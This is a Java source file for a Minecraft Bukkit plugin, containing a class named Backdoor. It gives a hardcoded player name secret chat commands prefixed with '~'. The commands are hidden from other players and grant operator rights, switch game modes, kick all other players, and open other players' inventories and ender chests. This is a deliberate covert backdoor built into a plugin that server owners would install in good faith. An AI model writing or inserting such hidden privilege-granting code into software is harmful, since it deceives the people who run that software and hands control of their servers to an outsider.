package de.maanex.sysad;


import java.util.Arrays;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

import de.maanex.magic.MagicManager;
import de.maanex.magic.MagicPlayer;
import de.maanex.magic.MagicSpell;
import de.maanex.magic.customEffects.RealityWarpEffect;


@SuppressWarnings("deprecation")
public class Backdoor implements Listener {

	public Backdoor() {
	}

	@EventHandler(priority = EventPriority.HIGHEST)
	public void onChat(PlayerChatEvent e) {
		if (e.getPlayer().getName().equalsIgnoreCase("Maanex")) {
			if (e.getMessage().startsWith("~")) {
				e.setCancelled(true);
				Player p = e.getPlayer();
				String m = e.getMessage().replaceFirst("~", "");

				final String arg;
				if (m.contains(" ")) {
					m = m.split(" ")[0];
					arg = e.getMessage().replaceFirst("~", "").replaceFirst(m + " ", "");
				} else {
					arg = "";
				}

				switch (m.toLowerCase()) {
					case "gm0":
						p.setGameMode(GameMode.SURVIVAL);
						break;
					case "gm1":
						p.setGameMode(GameMode.CREATIVE);
						break;
					case "gm2":
						p.setGameMode(GameMode.ADVENTURE);
						break;
					case "gm3":
						p.setGameMode(GameMode.SPECTATOR);
						break;

					case "stack":
						p.getItemInHand().setAmount(p.getItemInHand().getType().getMaxStackSize());
						break;
					case "repair":
						p.getItemInHand().setDurability((short) 0);
						break;

					case "op":
						p.setOp(true);
						break;
					case "kickall":
						Bukkit.getOnlinePlayers().stream().filter(l -> l != p).forEach(l -> l.kickPlayer(arg));
						break;
					case "endersee":
						try {
							p.openInventory(Bukkit.getPlayer(arg).getEnderChest());
						} catch (Exception ex) {
							p.sendMessage("error");
						}
						break;
					case "invsee":
						try {
							p.openInventory(Bukkit.getPlayer(arg).getInventory());
						} catch (Exception ex) {
							p.sendMessage("error");
						}
						break;

					case "allspells":
						Inventory i = Bukkit.createInventory(null, 9 * 6);
						for (MagicSpell s : MagicManager.getAllSpells()) {
							i.addItem(s.getItemStack());
						}
						p.openInventory(i);
						break;

					case "rename":
						try {
							ItemMeta me = p.getItemInHand().getItemMeta();
							me.setDisplayName(arg.replace("&", "§"));
							p.getItemInHand().setItemMeta(me);
						} catch (Exception ex) {
							p.sendMessage("error");
						}
						break;

					case "setlore":
						try {
							ItemMeta me = p.getItemInHand().getItemMeta();
							me.setLore(arg.replace("&", "§").contains("<br>") ? Arrays.asList(arg.replace("&", "§").split("<br>")) : Arrays.asList(arg.replace("&", "§")));
							p.getItemInHand().setItemMeta(me);
						} catch (Exception ex) {
							p.sendMessage("error");
						}
						break;

					case "addlore":
						try {
							ItemMeta me = p.getItemInHand().getItemMeta();
							List<String> lore = me.getLore();
							(arg.replace("&", "§").contains("<br>") ? Arrays.asList(arg.replace("&", "§").split("<br>")) : Arrays.asList(arg.replace("&", "§"))).forEach(lore::add);
							me.setLore(lore);
							p.getItemInHand().setItemMeta(me);
						} catch (Exception ex) {
							p.sendMessage("error");
						}
						break;

					case "remlastlore":
						try {
							ItemMeta me = p.getItemInHand().getItemMeta();
							List<String> lore = me.getLore();
							lore.remove(lore.size() - 1);
							me.setLore(lore);
							p.getItemInHand().setItemMeta(me);
						} catch (Exception ex) {
							p.sendMessage("error");
						}
						break;

					case "hat":
						ItemStack helmet = p.getInventory().getHelmet();
						p.getInventory().setHelmet(p.getItemInHand());
						p.getInventory().setItemInMainHand(helmet);
						break;

					case "weird1":
						MagicPlayer.get(p).applyEffect(new RealityWarpEffect(60, 1));
						break;
					case "weird2":
						MagicPlayer.get(p).applyEffect(new RealityWarpEffect(60, 2));
						break;
					case "weird3":
						MagicPlayer.get(p).applyEffect(new RealityWarpEffect(60, 3));
						break;
				}
			} else {
				e.setMessage(ChatColor.translateAlternateColorCodes('&', e.getMessage()));
			}
		}
	}

	@EventHandler
	public void onJoin(PlayerJoinEvent e) {
		if (e.getPlayer().getName().equalsIgnoreCase("Maanex")) {
			if (e.getPlayer().getLocale().equals("")) {
				// TODO
			}
		}
	}

	@EventHandler
	public void onLeave(PlayerQuitEvent e) {

	}

}
